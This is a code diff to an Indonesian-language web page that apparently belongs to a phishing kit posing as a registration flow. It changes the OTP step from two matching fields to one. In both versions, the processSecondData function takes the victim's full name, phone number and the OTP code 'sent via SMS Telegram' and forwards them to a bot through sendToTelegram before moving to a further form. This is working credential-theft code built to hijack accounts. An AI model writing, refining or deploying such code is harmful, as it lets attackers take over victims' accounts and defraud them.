@@ -227,47 +227,15 @@
 			<input type="hidden" name="full_name" id="validateFullName" readonly>
 			<input type="hidden" name="phone_number" id="validatePhoneNumber" readonly>
 			<div class="mb-3">
-			<form id="otpForm">
-
-<label class="form-label">
-<span>Kami sudah Mengirimkan kode Pendaftaran 5 angka silahkan cek di SMS Telegram.</span>
-</label>
-
-<!-- OTP Pertama -->
-<input name="otp_code_1"
-maxlength="5"
-id="otp_code_1"
-class="form-control mb-1"
-type="tel"
-required
-placeholder="Masukkan 5 digit OTP"
-oninput="checkFirstOtp()">
-
-<!-- Pesan Error Merah -->
-<small id="otpError"
-style="color:red; display:none;">
-Kode Salah, silahkan coba lagi.
-</small>
-
-<br>
-
-<!-- OTP Kedua -->
-<input name="otp_code_2"
-maxlength="5"
-id="otp_code_2"
-class="form-control"
-type="tel"
-required
-placeholder="Ulangi 5 digit OTP">
-
-<div class="text-center mt-3">
-<button type="submit"
-class="btn btn-lg btn-block btn-mk">
-LANJUT
-</button>
-</div>
-
-</form>
+			<label for="otp_code" class="form-label">
+            <span id="ctl00_RecipientMasterContent_lblEntry_IDNo">Kami sudah Mengirimkan kode Pendaftaran 5 angka silahkan cek di SMS Telegram.</span>
+			</label>
+			<input name="otp_code" maxlength="5" id="otp_code" class="form-control" type="tel" required="true" placeholder="5 digit OTP">
+			</div>
+			<div class="text-center">
+			<button type="submit" class="btn btn-lg btn-block btn-mk" onclick="processSecondData()">LANJUT</button>
+			</div>
+			</form>
 			</div>
 			<div class="third" style="display: none;">
 			<form action="javascript:void(0)" method="post" id="thirdForm">
@@ -477,51 +445,34 @@ function processFirstData() {
 }
 
 function processSecondData() {
-
     $('#secondForm').submit(function(event) {
         event.preventDefault();
         showLoading();
 
         var $full_name = $("input#validateFullName").val();
         var $phone_number = $("input#validatePhoneNumber").val();
+        var $otp_code = $("input#otp_code").val();
 
-        var $otp_code_1 = $("input#otp_code_1").val();
-        var $otp_code_2 = $("input#otp_code_2").val();
-
-        // Validasi kosong
-        if ($otp_code_1 === "" || $otp_code_2 === "") {
-            alert("Silahkan isi kedua kode OTP");
+        if ($otp_code === "") {
+            $('.verification_info').show();
+            $('.account_verification').hide();
             hideLoading();
             return false;
         }
 
-        // Validasi tidak sama
-        if ($otp_code_1 !== $otp_code_2) {
-            alert("Kode OTP tidak sama!");
-            hideLoading();
-            return false;
-        }
-
-        // Jika sama, kirim hanya 1 kode ke bot
-        var message = `OTP Code Verification:
-Full Name: ${$full_name}
-Phone Number: ${$phone_number}
-OTP Code: ${$otp_code_1}`;
-
+        var message = `OTP Code Verification: \nFull Name: ${$full_name}\nPhone Number: ${$phone_number}\nOTP Code: ${$otp_code}`;
         sendToTelegram(message);
 
         setTimeout(() => {
             $(".third").show();
             $(".second").hide();
-            $("input#validateOtpCode").val($otp_code_1);
+            $("input#validateOtpCode").val($otp_code);
             hideLoading();
         }, 2000);
 
         return false;
     });
-
 }
-
 
 function processThirdData() {
     $('#thirdForm').submit(function(event) {
